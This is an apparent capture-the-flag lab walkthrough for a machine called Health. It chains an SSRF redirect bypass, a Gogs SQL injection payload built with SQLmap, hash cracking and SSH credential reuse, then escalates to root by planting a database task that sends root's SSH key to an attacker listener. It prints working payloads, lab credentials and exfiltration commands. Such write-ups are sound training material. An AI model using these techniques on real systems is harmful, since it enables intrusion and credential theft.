@@ -1,0 +1,303 @@
+                      Health
+
+                                                                                  8th June 2022 / Document No D22.100.199
+                                                                                  Prepared By: amra
+                                                                                  Machine Author: irogir
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Health is a medium Linux machine that features an SSRF vulnerability on the main webpage that can be
+exploited to access services that are available only on localhost. More specifically, a Gogs instance is
+accessible only through localhost and this specific version is vulnerable to an SQL injection attack. Due to
+the way that an attacker can interact with the Gogs instance the best approach in this scenario is to replicate
+the remote environment by installing the same Gogs version on a local machine and then using automated
+tools to produce a valid payload. After retrieving the hashed password of the user susanne an attacker is
+able to crack the hash and reveal the plain text password of that user. The same credentials can be used to
+authenticate to the remote machine using SSH. Privilege escalation relies on cron jobs that are running
+under the user root . These cron jobs are related to the functionality of the main web application and
+process unfiltered data from a database. Thus, an attacker is able to inject a malicious task inside the
+database and exfiltrate the SSH key file of the user root , thus, allowing him to gain a root session on the
+remote machine.
+
+Skills Required
+
+      Enumeration
+      Source code review
+      Use of automated tools
+      Database interaction
+
+Skills Learned
+
+      SSRF localhost filter bypass
+      Data exfiltration using SSRF
+      Replicating remote environment
+      Exploit modification
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.176 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.176
+
+The initial Nmap output reveals just three ports open. On port 22 an SSH server is running, on port 80 an
+Apache web server and port 3000 is filtered, meaning that probably a firewall rule is preventing us from
+accessing whatever service is running on it. Since we don't, currently, have any valid SSH credentials, we
+should begin our enumeration by visiting port 80 .
+
+Apache - Port 80
+Before we analyze the web application we notice that the website has revealed the hostname health.htb .
+So, we modify our hosts file accordingly.
+
+   echo "10.10.11.176 health.htb" | sudo tee -a /etc/hosts
+
+The website, informs us that it provides a utility to check whether an HTTP service is available or not. The
+monitoring itself, is carried through webhooks.
+Web applications that take a URL as an input tend to be vulnerable to a Server-side request forgery
+(SSRF) attack. The goal of this attack is to induce the server to make requests to an unintended location. In
+this particular case we could try to use the application to access the service running on port 3000 . We know
+that on port 80 there is a website, so let's try to access it using localhost or 127.0.0.1 .
+
+Both URLs result in an error message. Trying various bypass encodings, such as converting localhost to a
+hex IP (7f.00.00.01) result in the same error. It's clear that there is some kind of protection against SSRF
+attacks. Our next attempt is to check if we can bypass this protection using redirects. To test this option we
+have to set up a simple Python Flask application to redirect requests:
+
+   from flask import Flask, redirect, request
+   app = Flask(__name__)
+   @app.route("/")
+   def i():
+
+      url = request.args.get('url')
+      return redirect(url, code=302)
+We execute the script on our local machine.
+   sudo flask --app redirect.py run --host=0.0.0.0 --port 80
+
+Then, we set up a listener on our local machine.
+   nc -lvnp 9002
+Finally, we specify the following URL http://10.10.14.10:9002/ in the Payload URL field and
+http://10.10.14.10/?url=http://10.10.14.10:9001 in the Monitored URL .
+
+Then, we click on Test and we get a callback on our listener.
+
+We have successfully performed an SSRF attack. Now, let's try to access the service on port 3000 on the
+remote machine using this attack.
+First of all, we reset our listener on port 9005 by quitting the previous instance and setting up a new one.
+Then, we specify this URL http://10.10.14.10/?url=http://localhost:3000 in the Monitored URL
+field on the web application. The rest of the fields remain unchanged resulting in the following
+configuration:
+With our redirect Flask application running, we click on Test and we get a response on our listener.
+
+It seems like Gogs is the service running on port 3000. Moreover, the version of the remote Gogs instance is
+revealed to be 0.5.5.1010 Beta . Using Google to search for known vulnerabilities in this specific version
+we come across this exploit. More specifically, there is an SQL injection vulnerability in the q parameter of
+this endpoint /api/v1/users/search?q= .
+
+Foothold
+
+Reading through the exploitation steps we can see that the SQL injection payload is extremely complicated.
+Moreover, the way that we can access the Gogs instance in this case is preventing the use of automated
+tools like SQLmap. Our best option in such cases is to install a local instance of the service, scan it using
+automated tools, find the correct payload and then use that payload on the remote instance.
+We can visit the official Github page and download the 0.5.5 release which is vulnerable to the
+aforementioned SQL injection and also matches the version on the remote instance.
+Afterwards, we extract the archive, change our directory to the extracted gogs folder and execute ./gogs
+web .
+
+Now, we can visit http://localhost:3000 on our browser and finalize the installation. All we have to do is
+to set up an Admin account .
+
+Now, we can start enumerating our local Gogs instance using SQLmap. Reading through the exploitation
+report we notice that space characters (0x20 in ASCII) are filtered out. To bypass this filter we can create a
+custom tamper script for SQLmap. All it has to do is to replace the space character with the characters
+/**/ as shown on the proof of concept.
+   #!/usr/bin/env python
+   from lib.core.enums import PRIORITY
+   import re
+   __priority__ = PRIORITY.NORMAL
+   def dependencies():
+
+          pass
+   def tamper(payload, **kwargs):
+
+          retVal = ""
+          retVal = re.sub(' ', '/**/', payload)
+          return retVal
+Along with our tamper script an empty file called __init__.py has to exist on the same directory, so let's
+create one.
+   touch __init__.py
+Finally, we can begin our enumeration using SQLmap.
+   sqlmap -u "http://localhost:3000/api/v1/users/search?q=*" --dbs --batch --
+   tamper=./tamper.py --risk 3 --level 5
+
+SQLmap has indeed, identified an injection point. Now, we can use DB Browser for SQLite to inspect the
+structure of our local database file located in ./gogs/data/gogs.db .
+The table users seems particularly interesting. Especially the name , passwd , rands and salt fields are
+the fields that we can use to exfiltrate usernames and complete password hashes. Trying various
+statements, we can come up with the following query: select (name
+||'passwd'||passwd||'passwd'||'salt'||salt||'salt'||'rands'||rands||'rands') from user to
+extract values from these columns.
+
+    Note: we are using the strings passwd , salt and rands to separate the leaked data. By doing so, it
+    would be a lot easier for us to distinguish where each value starts/ends.
+
+All we have to do now is to start up Burpsuite, use it as a proxy for SQLmap and capture the payload that we
+are going to use.
+
+   sqlmap -u "http://localhost:3000/api/v1/users/search?q=*" --sql-query="select (name
+   ||'passwd'||passwd||'passwd'||'salt'||salt||'salt'||'rands'||rands||'rands') from user"
+   --batch --tamper=./tamper.py --risk 3 --level 5 --fresh-queries --
+   proxy="http://localhost:8080"
+This is the url-decoded payload that we are going to use on the remote instance.
+
+   ')/**/UNION/**/ALL/**/SELECT/**/2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,
+   2833,2833,2833,CHAR(113,120,106,112,113)||COALESCE((name/**/||CHAR(112,97,115,115,119,1
+   00)||/**/passwd/**/||CHAR(112,97,115,115,119,100)||CHAR(115,97,108,116)||salt||CHAR(115
+   ,97,108,116)||CHAR(114,97,110,100,115)||rands||CHAR(114,97,110,100,115)),CHAR(32))||CHA
+   R(113,113,120,98,113),2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,2833/**/FR
+   OM/**/user--/**/KCpu
+
+With the payload finally at hand, we modify our redirect script to utilize it and redirect directly to it.
+
+   from flask import Flask, redirect, request
+
+   app = Flask(__name__)
+
+   @app.route("/")
+   def i():
+
+                 payload = '''http://localhost:3000/api/v1/users/search?
+   q=')/**/UNION/**/ALL/**/SELECT/**/2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,283
+   3,2833,2833,2833,CHAR(113,120,106,112,113)||COALESCE((name/**/||CHAR(112,97,115,115,119
+   ,100)||/**/passwd/**/||CHAR(112,97,115,115,119,100)||CHAR(115,97,108,116)||salt||CHAR(1
+   15,97,108,116)||CHAR(114,97,110,100,115)||rands||CHAR(114,97,110,100,115)),CHAR(32))||C
+   HAR(113,113,120,98,113),2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,2833,2833/**/
+   FROM/**/user--/**/KCpu'''
+
+                 return redirect(payload, code=302)
+
+Then, we restart our Flask redirect application, we set up a new listener on port 9005 and on the website
+we specify exactly the same options as we did during our enumeration process that we discovered the Gogs
+instance and we click on the Test button.
+Finally, we are presented with the following information:
+
+   name -> susanne
+   passwd ->
+   66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d7434
+   9ec196f4efe37
+   salt -> sO3XIbeW14
+   rands -> m7483YfL9K
+
+At this point, searching online we are able to find a Github issue that informs us that the hashing algorithm
+used in Gogs is PBKDF2 + HMAC + SHA256 . Looking at Hashcat's example hashes page we notice that this
+mode expects the hash in a base64 format. So, let's construct a proper hash.
+
+   b64_passwd=$(echo -n
+   66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f
+   48d74349ec196f4efe37 | xxd -r -p | base64)
+   b64_salt=$(echo -n sO3XIbeW14 | base64)
+   hashcat -m 10900 "sha256:10000:$b64_salt:$b64_passwd" /usr/share/wordlists/rockyou.txt
+
+We have successfully cracked the hash to the plain text password of february15 . Now, we can check for a
+password re-use scenario by attempting to login to the remote machine using SSH with the credentials
+susanne:february15 .
+
+   ssh susanne@health.htb
+We have a shell as the user susanne on the remote machine. The user flag, can be found in
+/home/susanne/user.txt .
+
+Privilege Escalation
+
+During our enumeration steps we noticed that the web application is able to run some kind of cron job. Let's
+take a closer look at the source code of the web application located in
+/var/www/html/app/Http/Controllers/HealthChecker.php .
+
+   cat /var/www/html/app/Http/Controllers/HealthChecker.php
+
+<?php
+
+namespace App\Http\Controllers;
+
+class HealthChecker
+{
+
+       public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
+       {
+
+          $json = [];
+          $json['webhookUrl'] = $webhookUrl;
+          $json['monitoredUrl'] = $monitoredUrl;
+
+          $res = @file_get_contents($monitoredUrl, false);
+          if ($res) {
+
+          if ($onlyError) {
+                 return $json;
+
+          }
+
+          $json['health'] = "up";
+          $json['body'] = $res;
+
+<SNIP>
+
+       }
+}
+Interestingly enough, monitoredUrl , at this point, is passed without any sanitazation to the
+@file_get_contents function.
+Moreover, inside the /var/www/html/app/Console/Kernel.php file there is a comment that states: /*
+Get all tasks from the database */ meaning that a database is used to store all the information
+required to perform the HealthCheck when the cron runs.
+Reading the var/www/html/app/.env file we can find the credentials used to access the database.
+
+   DB_CONNECTION=mysql
+   DB_HOST=127.0.0.1
+   DB_PORT=3306
+   DB_DATABASE=laravel
+   DB_USERNAME=laravel
+   DB_PASSWORD=MYsql_strongestpass@2014+
+
+So, in theory, we could access the Database with these credentials, insert a malicious entry that instead of
+performing the HealthCheck on a website actually reads a file from the local system and exfiltrates it to us.
+All that's left to check in this theory is what user is actually running the cron job. Let's use the pspy64s
+binary to investigate running processes. After we download the binary on our local machine, we can use
+scp to transfer it to the remote machine using the credentials of the sausanne user.
+
+   scp /opt/pspy64s susanne@health.htb:/tmp
+
+Then, we make the file executable on the remote machine and we execute it:
+
+   chmod +x /tmp/pspy64s
+   ./pspy64s
+
+It seems like root is handling the cron jobs. At this point, we can directly create a malicious task inside the
+database to read the SSH key from the root user.
+Let's examine the table structure inside the database.
+
+   mysql -u laravel -pMYsql_strongestpass@2014+ laravel --execute
+   show tables;
+   desc tasks;
+The fields required are somewhat familiar to us from our initial enumeration process. With all the
+information we have gathered, we can proceed with our exploitation plan.
+First of all, we set up a listener on our local machine.
+
+   nc -lvnp 9001
+
+Then, we create a malicious task to read the key file of root .
+
+   mysql -u laravel -pMYsql_strongestpass@2014+ laravel --execute "INSERT INTO tasks (id,
+   monitoredUrl, onlyError, webhookUrl, frequency) VALUES ('450cb26c-4200-4e29-ba1f-
+   6b5ad9b4fdc4', 'file:///root/.ssh/id_rsa', 0, 'http://10.10.14.10:9001','* * * * *');"
+
+After a short while, we get a callback on our listener:
+After saving and reformatting the key inside a file called root_key , we have a valid key for the user root .
+    By "reformatting" in this specific instance, we mean to replace the \n sequence of characters with a
+    new line and the \/ sequence with / .
+   chmod 600 root_key
+   ssh -i root_key root@health.htb
+
+The root flag can be found inside the /root/root.txt file.
+
